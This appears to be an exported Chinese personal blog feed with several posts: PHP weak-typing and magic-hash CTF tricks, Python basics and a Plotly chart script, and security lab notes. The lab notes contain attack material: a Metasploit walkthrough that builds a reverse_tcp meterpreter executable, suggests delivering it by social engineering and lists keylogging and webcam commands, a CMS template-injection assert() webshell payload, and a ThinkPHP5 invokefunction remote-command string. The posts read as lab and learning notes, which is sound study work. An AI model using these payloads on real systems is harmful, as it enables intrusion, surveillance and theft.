<h4 id="4-直接通读全文代码"><a href="#4-直接通读全文代码" class="headerlink" title="4.直接通读全文代码"></a>4.直接通读全文代码</h4><h3 id="敏感函数回溯审计："><a href="#敏感函数回溯审计：" class="headerlink" title="敏感函数回溯审计："></a>敏感函数回溯审计：</h3><p><img src="/2021/08/31/2021/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103125151.png" alt="image-20210901103125151"></p>
<h4 id="通读全文代码"><a href="#通读全文代码" class="headerlink" title="通读全文代码"></a>通读全文代码</h4><p><img src="/2021/08/31/2021/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103255032.png" alt="image-20210901103255032"></p>
<p><img src="/2021/08/31/2021/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103436076.png" alt="image-20210901103436076"></p>
<h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><p>php弱类型</p>
<h4 id="1-比较符号"><a href="#1-比较符号" class="headerlink" title="1.比较符号"></a>1.比较符号</h4><p>==            先进行类型转化，再进行比较（弱比较）</p>
<p>===          先比较类型，若类型不同直接返回不等（强比较）</p>
<p>Tips</p>
<p>Bool类型的true和任意字符串的弱类型相等</p>
<p>数字与字符串相比较，会将字符串转化为数字</p>
<p>若字符串以数字开头，则取开头数字作为转化结果，</p>
<p>若无则转化为0，若符合科学记数法的形式，则按照科学记数法来取</p>
<h4 id="2-hash比较缺陷"><a href="#2-hash比较缺陷" class="headerlink" title="2.hash比较缺陷"></a>2.hash比较缺陷</h4><p>如果采用</p>
<p>== 运算符比较哈希值，会面临上面讲的弱类型比较的问题，</p>
<p>即任何以’0e’ 开头的字符串都相等！</p>
<p>常见的md5</p>
<p>运算后以’0e’开头的字符串有：</p>
<p>QNKCDZO</p>
<p>s878926199a</p>
<p>s155964671a</p>
<p>s1885207154a</p>
<p>s1836677006a</p>
<p>s1184209335a</p>
<p><img src="/2021/08/31/2021/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901104340610.png" alt="image-20210901104340610"></p>
<h4 id="3-md5-sha1函数缺陷"><a href="#3-md5-sha1函数缺陷" class="headerlink" title="3.md5 sha1函数缺陷"></a>3.md5 sha1函数缺陷</h4><p>当md5()函数与sha1()函数对参数进行加密处理时，</p>
<p>如果碰到一个数组，md5()函数会返回null</p>
<p>sha1()函数也是一样。</p>
<p>利用这个特性构造两个数组即可。</p>
<p>a[]=1即表示传入了一个数组</p>
<p><img src="/2021/08/31/2021/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901104608235.png" alt="image-20210901104608235"></p>
<p>变量覆盖</p>
<h4 id="1-parse-str导致的变量覆盖"><a href="#1-parse-str导致的变量覆盖" class="headerlink" title="1.parse_str导致的变量覆盖"></a>1.parse_str导致的变量覆盖</h4><p>parse_str( string $encoded_string[.array &amp;$result] )</p>
<p>parse_str() 函数用于把查询字符串解析到变量中，</p>
<p>如果没有result参数，则由该函数设置的变量将覆盖已存在的同名变量，</p>
<p>如果设置了第二个变量result</p>
<p>变量将会以数组元素的形式存入到这个数组，作为替代。</p>
<p><img src="/2021/08/31/2021/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901145407518.png" alt="image-20210901145407518"></p>
<h4 id="2-X-Forwarded-For绕过指定地址"><a href="#2-X-Forwarded-For绕过指定地址" class="headerlink" title="2.X-Forwarded-For绕过指定地址"></a>2.X-Forwarded-For绕过指定地址</h4><p>HTTP头添加X-Forwarded-For：</p>
<h4 id="3-strops数组绕过NULL与ereg正则-00截断"><a href="#3-strops数组绕过NULL与ereg正则-00截断" class="headerlink" title="3.strops数组绕过NULL与ereg正则%00截断"></a>3.strops数组绕过NULL与ereg正则%00截断</h4><p>知识点补充：</p>
<p>PHP strops()函数</p>
<p>定义和用法：</p>
<p>strops()函数查找字符串在另一字符串第一次出现的位置</p>
<p>注释：strops()函数对大小写敏感</p>
<p>​            该函数是二进制安全的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">strpos(<span class="hljs-keyword">string</span>,find,start)<br></code></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>string</em></td>
<td align="left">必需。规定要搜索的字符串。</td>
</tr>
<tr>
<td align="left"><em>find</em></td>
<td align="left">必需。规定要查找的字符串。</td>
</tr>
<tr>
<td align="left"><em>start</em></td>
<td align="left">可选。规定在何处开始搜索。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>返回值：</th>
<th>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。<strong>注释：</strong>字符串位置从 0 开始，不是从 1 开始。</th>
</tr>
</thead>
<tbody><tr>
<td>PHP 版本：</td>
<td>4+</td>
</tr>
</tbody></table>
<p>ereg正则函数</p>
<p>字符串比对解析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span> ereg(<span class="hljs-keyword">string</span> pattern, <span class="hljs-keyword">string</span> <span class="hljs-keyword">string</span>, <span class="hljs-keyword">array</span> [regs]);<br></code></pre></td></tr></table></figure>

<p>本函数以 pattern 的规则来解析比对字符串 string。</p>
<p>比对结果返回的值放在数组参数 regs 之中，regs[0] 内容就是原字符串 string、regs[1] 为第一个合乎规则的字符串、regs[2] 就是第二个合乎规则的字符串，余类推。若省略参数 regs，则只是单纯地比对，找到则返回值为 true。</p>
<p><img src="/2021/08/31/2021/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901150729125.png" alt="image-20210901150729125"></p>
<p>方法一：</p>
<p>既要是纯数字</p>
<p>又要有’ #biubiubiu’</p>
<p>strpos()找的是字符串，那么传一个数组给它</p>
<p>strpos()出错返回null,null!==false,</p>
<p>所以符合要求</p>
<p>所以输入nctf[]= </p>
<p>那为什么ereg()也能符合呢?</p>
<p>因为ereg()</p>
<p>在出错时返回的也是null,null!==false,</p>
<p>所以符合要求</p>
<p>方法二：</p>
<p>字符串截断</p>
<p>利用ereg()的NULL截断漏洞，绕过正则过滤</p>
<p>?nctf=1%00%23biubiubiu </p>
<h3 id="模拟演练："><a href="#模拟演练：" class="headerlink" title="模拟演练："></a>模拟演练：</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p><img src="/2021/08/31/2021/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/capture_20210831213941122.bmp" alt="capture_20210831213941122"></p>
<p>?password=1337a</p>
<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p><img src="/2021/08/31/2021/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/capture_20210831214131149.bmp" alt="capture_20210831214131149"></p>
<p>?name[]=1&amp;passsword[]=2</p>
<p>解析：sha1()函数默认的传入参数类型是字符串，当传入数组时均会返回false，通过判断。</p>
<h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><p><img src="/2021/08/31/2021/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901105909901.png" alt="image-20210901105909901"></p>
<p>?a=240610708或?a=s878926199a</p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>python_tip</title>
    <url>/2021/07/22/2021/python/python_tip/</url>
    <content><![CDATA[<h3 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h3><p>搭建python的编程环境：subline text、pycharm……</p>
<h3 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h3><p>变量，eg：message  =  ‘’Hello World”</p>
<p>​                    print(message)</p>
<p>输出：Hello World，这里我们添加了一个名为message的变量，它指向的值为文本“Hello World”。</p>
<p>在程序中可随时改变变量的值，而python将始终记录变量的最新值。</p>
<p>变量命名条件：</p>
<p>​                        1.只能包含数字、字母和下划线。且开头只能以字母或下划线开头，不能以数字开头。</p>
<p>​                        2.不能包含空格，但可以使用下划线来分隔其中的单词。</p>
<p>​                        3.勿将python关键字和函数名作为变量名。</p>
<p>​                        4.应该简短又具有描述性。</p>
<p>​                        5.数字1和字母l，数字0和字母o要注意区分。</p>
<p>若出现错误时，往往可以见到    Traceback（most recent call most）的解释器告知错误。</p>
<p>字符串，就是一系列字符，用引号括起的都是字符串，单双引号皆可。</p>
<p>“This is a string.”</p>
<p>‘This is a string.’</p>
<p>方法修改字符大小写：变量名.title()，首字母大写</p>
<p>​                                       变量名.upper()，全部大写</p>
<p>​                                        变量名.lower()，全部小写</p>
<p>字符串的组合，引号里加上中括号，eg：</p>
<p>​    <code>first_name = &quot;ada&quot;</code></p>
<p>​    <code>last_name = &quot;lovelace&quot;</code></p>
<p>​    <code>full_name = f&quot;&#123;first_name&#125; &#123;last_name&#125;&quot;</code></p>
<p>​    <code>print(full_name)</code></p>
<p>这里的字符串命名为f字符串，f是format（设置格式）的简写。</p>
<p>添加空白：空格、制表符、换行符， /t, /n</p>
<p>删除空白：方法rstrip</p>
<p>同时给多个变量赋值：x，y，z = 0，0，0</p>
<p>常量：在代码中，要指出应将特定的变量视为常量，可将其字母全部大写。</p>
<p>注释：句子前加#号。</p>
<h3 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h3>]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python_visual</title>
    <url>/2021/07/19/2021/python/python-visual/</url>
    <content><![CDATA[<p>​    使用Plotly可视化仓库</p>
<p>​    创建了可视化python图表，以html形式呈现</p>
<p><img src="/2021/07/19/2021/python/python-visual/image-20210719204819823.png" alt="image-20210719204819823"></p>
<p>上图为Github上python库受欢迎程度</p>
<p>代码如下：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">import requests<br><br><span class="hljs-keyword">from</span> plotly.graph_objs import Bar<br><span class="hljs-keyword">from</span> plotly import offline<br><br><span class="hljs-comment">#执行API调用并存储响应</span><br>url = <span class="hljs-string">&#x27;https://api.github.com/search/repositories?q=language:python&amp;sort=stars&#x27;</span><br>headers = &#123;<span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;application/vnd.github.v3+json&#x27;</span>&#125;<br>r = requests.<span class="hljs-builtin-name">get</span>(url,<span class="hljs-attribute">headers</span>=headers)<br><span class="hljs-builtin-name">print</span>(f<span class="hljs-string">&quot;Status code: &#123;r.status_code&#125;&quot;</span>)<br>response_dict = r.json()<br>repo_dicts = response_dict[<span class="hljs-string">&#x27;items&#x27;</span>]<br>repo_names,stars = [], []<br><span class="hljs-keyword">for</span> repo_dict <span class="hljs-keyword">in</span> repo_dicts:<br>    repo_names.append(repo_dict[<span class="hljs-string">&#x27;name&#x27;</span>])<br>    stars.append(repo_dict[<span class="hljs-string">&#x27;stargazers_count&#x27;</span>])<br><br><span class="hljs-comment">#可视化</span><br>data = [&#123;<br>    <span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;bar&#x27;</span>,<br>    <span class="hljs-string">&#x27;x&#x27;</span>: repo_names,<br>    <span class="hljs-string">&#x27;y&#x27;</span>:stars,<br>&#125;]<br>my_layout = &#123;<br>    <span class="hljs-string">&#x27;title&#x27;</span>:<span class="hljs-string">&#x27;Github上最受欢迎的Python项目&#x27;</span>,<br>    <span class="hljs-string">&#x27;xaxis&#x27;</span>:&#123;<span class="hljs-string">&#x27;title&#x27;</span>: <span class="hljs-string">&#x27;Repository&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;yaxis&#x27;</span>:&#123;<span class="hljs-string">&#x27;title&#x27;</span>:<span class="hljs-string">&#x27;Stars&#x27;</span>&#125;,<br>&#125;<br>fig = &#123;<span class="hljs-string">&#x27;data&#x27;</span>: data, <span class="hljs-string">&#x27;layout&#x27;</span>:my_layout&#125;<br>offline.plot(fig, <span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;python_repos.html&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>Status code: 200 ，意味着访问成功。</p>
<p>Tips:如果遇到代码运行失败并且是出现了如下类似错误</p>
<hr>
<p>Traceback (most recent call last)<br><strong>C:\Users\mr-chen\Anaconda3\envs\hadoop\lib\site-packages\urllib3\connection.py in _new_conn(self)</strong><br> 158             conn = connection.create_connection(</p>
<hr>
<p>这是因为url路径为GitHub的网站，对于国内访问的我们来说不稳定</p>
<p>即使添加进了hosts文件也偶尔会出现访问失败的情况</p>
<p>在代码运行是就会出现上述traceback报错报告。</p>
<p>找到解决方法的相关文章来源于：</p>
<p><a href="https://blog.csdn.net/visoprkx/article/details/88925116">使用python pyhdfs操作hadoop 出现ConnectionError: HTTPConnectionPool(host=’bigdata-senior03.chybinmy.com’_visoprkx的专栏-CSDN博客</a></p>
<p>改进Plotly图表、添加自定义工具提示、在图表中添加可单击的链接后的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">from</span> plotly.graph_objs <span class="hljs-keyword">import</span> Bar<br><span class="hljs-keyword">from</span> plotly <span class="hljs-keyword">import</span> offline<br><br><span class="hljs-comment">#执行API调用并存储响应</span><br>url = <span class="hljs-string">&#x27;https://api.github.com/search/repositories?q=language:python&amp;sort=stars&#x27;</span><br>headers = &#123;<span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;application/vnd.github.v3+json&#x27;</span>&#125;<br>r = requests.get(url,headers=headers)<br>print(<span class="hljs-string">f&quot;Status code: <span class="hljs-subst">&#123;r.status_code&#125;</span>&quot;</span>)<br>response_dict = r.json()<br>repo_dicts = response_dict[<span class="hljs-string">&#x27;items&#x27;</span>]<br>repo_links, stars, labels = [], [], []<br><span class="hljs-keyword">for</span> repo_dict <span class="hljs-keyword">in</span> repo_dicts:<br>    repo_name = repo_dict[<span class="hljs-string">&#x27;name&#x27;</span>]<br>    repo_url = repo_dict[<span class="hljs-string">&#x27;html_url&#x27;</span>]<br>    repo_link = <span class="hljs-string">f&quot;&lt;a href=&#x27;<span class="hljs-subst">&#123;repo_url&#125;</span>&#x27;&gt;<span class="hljs-subst">&#123;repo_name&#125;</span>&lt;/a&gt;&quot;</span><br>    repo_links.append(repo_link)<br>    stars.append(repo_dict[<span class="hljs-string">&#x27;stargazers_count&#x27;</span>])<br><br>    owner = repo_dict[<span class="hljs-string">&#x27;owner&#x27;</span>][<span class="hljs-string">&#x27;login&#x27;</span>]<br>    description = repo_dict[<span class="hljs-string">&#x27;description&#x27;</span>]<br>    label = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;owner&#125;</span>&lt;br /&gt;<span class="hljs-subst">&#123;description&#125;</span>&quot;</span><br>    labels.append(label)<br><br><span class="hljs-comment">#可视化</span><br>data = [&#123;<br>    <span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;bar&#x27;</span>,<br>    <span class="hljs-string">&#x27;x&#x27;</span>: repo_links,<br>    <span class="hljs-string">&#x27;y&#x27;</span>:stars,<br>    <span class="hljs-string">&#x27;hovertext&#x27;</span>: labels,<br>    <span class="hljs-string">&#x27;marker&#x27;</span>: &#123;<br>        <span class="hljs-string">&#x27;color&#x27;</span>: <span class="hljs-string">&#x27;rgb(60, 100, 150)&#x27;</span>,<br>        <span class="hljs-string">&#x27;line&#x27;</span>: &#123;<span class="hljs-string">&#x27;width&#x27;</span>: <span class="hljs-number">1.5</span>, <span class="hljs-string">&#x27;color&#x27;</span>: <span class="hljs-string">&#x27;rgb(25,25,25)&#x27;</span>&#125;<br>    &#125;,<br>    <span class="hljs-string">&#x27;opacity&#x27;</span>: <span class="hljs-number">0.6</span>  <span class="hljs-comment">#CSS opacity 属性 如设置 div 元素的不透明级别，这里设置了条形的不透明度为0.6，以免图表过于惹眼。</span><br>&#125;]<br>my_layout = &#123;<br>    <span class="hljs-string">&#x27;title&#x27;</span>: <span class="hljs-string">&#x27;Github上最受欢迎的Python项目&#x27;</span>,<br>    <span class="hljs-string">&#x27;titlefont&#x27;</span>: &#123;<span class="hljs-string">&#x27;size&#x27;</span>: <span class="hljs-number">28</span>&#125;,<br>    <span class="hljs-string">&#x27;xaxis&#x27;</span>:&#123;<br>        <span class="hljs-string">&#x27;title&#x27;</span>: <span class="hljs-string">&#x27;Repository&#x27;</span>,<br>        <span class="hljs-string">&#x27;titlefont&#x27;</span>: &#123;<span class="hljs-string">&#x27;size&#x27;</span>: <span class="hljs-number">24</span>&#125;,<br>        <span class="hljs-string">&#x27;tickfont&#x27;</span>: &#123;<span class="hljs-string">&#x27;size&#x27;</span>: <span class="hljs-number">14</span>&#125;,<br><br>             &#125;,<br>    <span class="hljs-string">&#x27;yaxis&#x27;</span>:&#123;<br>        <span class="hljs-string">&#x27;title&#x27;</span>:<span class="hljs-string">&#x27;Stars&#x27;</span>,<br>        <span class="hljs-string">&#x27;titlefont&#x27;</span>: &#123;<span class="hljs-string">&#x27;size&#x27;</span>: <span class="hljs-number">24</span>&#125;,<br>        <span class="hljs-string">&#x27;tickfont&#x27;</span>: &#123;<span class="hljs-string">&#x27;size&#x27;</span>: <span class="hljs-number">14</span>&#125;,<br>    &#125;,<br>&#125;<br>fig = &#123;<span class="hljs-string">&#x27;data&#x27;</span>: data, <span class="hljs-string">&#x27;layout&#x27;</span>:my_layout&#125;<br>offline.plot(fig, filename=<span class="hljs-string">&#x27;python_repos.html&#x27;</span>)<br></code></pre></td></tr></table></figure>



<p><img src="/2021/07/19/2021/python/python-visual/image-20210720101944206.png" alt="image-20210720101944206"></p>
<p><img src="/2021/07/19/2021/python/python-visual/image-20210720102734849.png" alt="image-20210720102734849"></p>
<p>至此，我们对API获取的数据生成了可视化图表，它是交互性的，包含丰富的信息。</p>
<p>​                                                                        ——以上代码和部分内容来源于《Python编程 从入门到实践》</p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试_基础入门_概念名词</title>
    <url>/2021/08/27/2021/src/1/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/weixin_44519789/article/details/114131958">https://blog.csdn.net/weixin_44519789/article/details/114131958</a></p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>爬虫</title>
    <url>/2021/05/19/2021/python/%E7%88%AC%E8%99%AB/</url>
    <content><![CDATA[<p> 今天终于是成功做到了python爬虫</p>
<p>之前的失败</p>
<p>总结了一下太想当然直接搬人家代码</p>
<p>所以有些库没安装都不认真看</p>
<p>小小开心一下，嘿嘿</p>
<p><img src="/2021/05/19/2021/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(214).png"></p>
<p><img src="/2021/05/19/2021/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(215).png"></p>
<p><img src="/2021/05/19/2021/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(216).png"></p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>一次简单的kali渗透测试</title>
    <url>/2021/08/30/2021/src/0830/</url>
    <content><![CDATA[<h4 id="8-30"><a href="#8-30" class="headerlink" title="8.30"></a>8.30</h4><p> 参考链接：</p>
<p><a href="https://blog.csdn.net/k_love1219/article/details/104591110">记一次Kali系统渗透靶机(物理机)的详细过程（渗透必备）_k_love1219的博客-CSDN博客</a></p>
<p>首先开启kali-2018</p>
<p><img src="/2021/08/30/2021/src/0830/image-20210830165837896.png" alt="image-20210830165837896"></p>
<p>接着我们开始创建木马文件</p>
<p>输入以下指令：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">msfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp lhost=你的虚拟机ip地址 lport=<span class="hljs-number">4444</span> -f exe -o <span class="hljs-regexp">/root/</span>Desktop/aaa.exe<br></code></pre></td></tr></table></figure>

<p>桌面会生成名为aaa.exe的木马文件</p>
<p><img src="/2021/08/30/2021/src/0830/image-20210830170039670.png" alt="image-20210830170039670"></p>
<p>我们进入msfconsole</p>
<p><img src="/2021/08/30/2021/src/0830/image-20210830170155242.png" alt="image-20210830170155242"></p>
<p>使用如下一系列指令：</p>
<p>使用exploit/multi/handler</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/multi/</span>handler<br></code></pre></td></tr></table></figure>

<p>设置payload </p>
<figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br></code></pre></td></tr></table></figure>

<p>设置木马监听回传ip地址</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> lhost 你的虚拟机的<span class="hljs-comment">ip</span>地址<br></code></pre></td></tr></table></figure>

<p>设置木马监听回传端口</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><code class="hljs elm"><span class="hljs-title">set</span> l<span class="hljs-keyword">port</span> 4444<br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/30/2021/src/0830/image-20210830170532133.png" alt="image-20210830170532133"></p>
<p>还可以用 show options来确认是否设置成功</p>
<p>这时候我们利用社会工程学的知识来将木马病毒送进靶机</p>
<p>doge（可以设置放在物理机桌面上，然后点击运行即可，若不放心可自行前去任务管理器的详细信息查看是否有进程aaa.exe）</p>
<p><img src="/2021/08/30/2021/src/0830/image-20210831085318058.png" alt="image-20210831085318058"></p>
<p>可以看到建立了session</p>
<p>说明我们已经成功连上了靶机</p>
<p>试着运行一些指令</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sysinfo</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/30/2021/src/0830/image-20210831085740617.png" alt="image-20210831085740617"></p>
<p>查看了靶机的一些信息</p>
<p>此外还有的命令</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">getuid</span>    <span class="hljs-string">获取系统ID以及计算机名称</span><br><span class="hljs-attr">kill</span>    <span class="hljs-string">中止进程</span><br><span class="hljs-attr">ps</span>    <span class="hljs-string">列举正在运行中的进程</span><br><span class="hljs-attr">getpid</span>    <span class="hljs-string">获取当前进程标识符</span><br><span class="hljs-attr">keyscan_start</span>     <span class="hljs-string">开启按键记录会话</span><br><span class="hljs-attr">keyscan_stop</span>     <span class="hljs-string">终止按键记录会话</span><br><span class="hljs-attr">keyscan_dump</span>   <span class="hljs-string">转储从被攻击主机捕获到的按键</span><br><span class="hljs-attr">enumdesktops</span>    <span class="hljs-string">列举所有可访问到的桌面和工作站</span><br><span class="hljs-attr">getdesktop</span>    <span class="hljs-string">获取当前meterpreter桌面</span><br><span class="hljs-attr">setdesktop</span>    <span class="hljs-string">变更meterpreter当前桌面</span><br><span class="hljs-attr">webcam_list</span>   <span class="hljs-string">列举系统中所有的摄像头</span><br><span class="hljs-attr">webcam_snap</span>   <span class="hljs-string">捕获被攻击主机的快照</span><br><span class="hljs-attr">record_mic</span>    <span class="hljs-string">从主机的默认麦克风中记录环境声音</span><br><br></code></pre></td></tr></table></figure>

<p>找到更为高级的免杀木马文章：</p>
<p><a href="https://www.cnblogs.com/leeqizhi/p/13029755.html">MSF制作免杀木马 - 迷途小書童~ - 博客园 (cnblogs.com)</a></p>
<h4 id="8-31"><a href="#8-31" class="headerlink" title="8.31"></a>8.31</h4><p>今天找到另外一篇文章来获取shell</p>
<p>操作方法差不多</p>
<p><a href="https://blog.csdn.net/cxcsdn666/article/details/100813443">Kali利用MSF渗透Win 7获取shell_舞指如歌~的博客-CSDN博客</a></p>
<p>这次不懂为什么文件复制不到win7上，索性就用了物理机来试验</p>
<p><a href="https://blog.csdn.net/u012206617/article/details/97389338">获取Shell（提权）后的操作（windows、Linux）_墨痕诉清风的博客-CSDN博客_shell提权</a></p>
<p>这时候之前的一篇安全客文章就讲的十分详细了</p>
<p><a href="https://www.anquanke.com/post/id/235631">MSF使用详解 - 安全客，安全资讯平台 (anquanke.com)</a></p>
]]></content>
      <tags>
        <tag>src</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞挖掘演练(一)</title>
    <url>/2021/09/17/2021/src/2/</url>
    <content><![CDATA[<p>以下内容全部来自于：安恒信息</p>
<p>关于cms的源码</p>
<p><img src="/2021/09/17/2021/src/2/image-20210917152538626.png" alt="image-20210917152538626"></p>
<p>gitee.com上可以找到很多资源</p>
<p>同样github也是。</p>
<p>例子一：</p>
<p><img src="/2021/09/17/2021/src/2/image-20210917153534213.png" alt="image-20210917153534213"></p>
<p>观察以上代码，发现该php文件明显是该CMS的模板渲染核心代码</p>
<p>其中，对外调用paser_string函数，核心函数运行——parse,对各种标签进行解析。</p>
<p>所以联想到模板渲染常存在的SSTI漏洞</p>
<p><img src="/2021/09/17/2021/src/2/image-20210917153916987.png" alt="image-20210917153916987"></p>
<p>看到在处理标签时运用诸多eval()函数</p>
<p>所以接下来思路为：</p>
<p>根据eval()函数，追踪溯源，看是否存在可控变量。</p>
<p>ps：没有审计经验的人，建议把关键函数提取出来到本地的PHP环境进行debug调试</p>
<p>主要想法就是传递什么样的参数可以在eval中执行，并且确定eval中执行的代码是哪一块，是否可控。</p>
<p>假设传递{if:123}456{endif}</p>
<p>根据逻辑推敲，最后代码回进入到该分支中</p>
<p>并且$strlf的值是123</p>
<p><img src="/2021/09/17/2021/src/2/image-20210917154659350.png" alt="image-20210917154659350"></p>
<p>所以最后能够构成</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">if</span>(123)&#123;<span class="hljs-attribute">isFlag</span>=<span class="hljs-literal">true</span>;&#125;<span class="hljs-keyword">else</span>&#123;isFalse&#125;;<br></code></pre></td></tr></table></figure>

<p>接着，就是注入代码来getshell了</p>
<p>payload：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">&#123;<span class="hljs-keyword">if</span>:<span class="hljs-number">1</span>&#125;assert(<span class="hljs-variable">$_POST</span>[x];<span class="hljs-regexp">//</span>)<span class="hljs-number">123</span>&#123;endif&#125;<br></code></pre></td></tr></table></figure>

<p>拼接后：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">&#123;<span class="hljs-keyword">if</span>:<span class="hljs-number">1</span>&#125;assert(<span class="hljs-variable">$_POST</span>[x];<span class="hljs-regexp">//</span>)&#123;isFlag=true;&#125;<span class="hljs-keyword">else</span>&#123;isFalse&#125;;<br></code></pre></td></tr></table></figure>

<p>分析：1为永真条件，//将后面的注释了</p>
<p>最后就执行了assert($_POST[x]);</p>
<p>我们继续找传递参数的地方</p>
<p>反向追踪，调用labelif()函数的是_parse(),而 _parse只被parse_string调用</p>
<p><img src="/2021/09/17/2021/src/2/image-20210917155446820.png" alt="image-20210917155446820"></p>
]]></content>
      <tags>
        <tag>src</tag>
      </tags>
  </entry>
  <entry>
    <title>php代码审计(三)</title>
    <url>/2021/09/17/2021/src/3/</url>
    <content><![CDATA[<p> 这次试着尝试审计bluecms漏洞</p>
<p>安装bluecms的教程文章：</p>
<p><a href="https://blog.csdn.net/qq_41209264/article/details/106773255">渗透测试——bluecms安装及seay代码审计_fallingskies-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/wkzb/p/12732078.html">php代码审计]bluecms v1.6 sp1 - beiwo - 博客园 (cnblogs.com)</a></p>
<p>遇到的一个小坑就是访问安装页面一直为空白，还好解决啦</p>
<p>上面的文章已经讲解得很详细了</p>
<p><img src="/2021/09/17/2021/src/3/image-20210917202058053.png" alt="image-20210917202058053"></p>
<p>创建成功图如下：</p>
<p><img src="/2021/09/17/2021/src/3/image-20210917202743734.png" alt="image-20210917202743734"></p>
<p>跟着大佬文章阅读：</p>
<p>[<a href="https://www.cnblogs.com/wkzb/p/12732078.html">php代码审计]bluecms v1.6 sp1 - beiwo - 博客园 (cnblogs.com)</a></p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>ThiThinkPHP5.x 远程函数执行与sql注入</title>
    <url>/2021/07/18/2021/src/ThinkPHP5/</url>
    <content><![CDATA[<h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><p>实验地址：<a href="https://www.anquanlong.com/lab_detail?lab_id=4&lib=5">ThinkPHP5.x 远程函数执行与sql注入_安全龙-专注做企业网络安全服务与网络安全培训! (anquanlong.com)</a></p>
<p>知识梳理：</p>
<p><strong>PoC</strong>，全称“Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。</p>
<p><strong>Exp</strong>，全称“Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。</p>
<p><strong>Payload</strong>，中文“有效载荷”，指成功 exploit 之后，真正在目标系统执行的代码或指令。</p>
<p><strong>Shellcode</strong>，简单翻译“shell 代码”，是 Payload 的一种，由于其建立正向/反向 shell 而得名。</p>
<p>（用蚁剑连上之后，发现这是安全龙部署在阿里云上的环境）</p>
<p><img src="/2021/07/18/2021/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(280).png"></p>
<p>​    首先尝试了远程函数漏洞的初始语句：</p>
<p><code>?s=index/\think\app/invokefunction&amp;function=system&amp;return_value=&amp;command=</code></p>
<p><code>可执行Linux命令</code></p>
<p><img src="/2021/07/18/2021/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(281).png"></p>
<p>然后我们按照提示去写入一个文件，phpinfo的功能</p>
<p>利用到了file_put_contents函数（POC分析）</p>
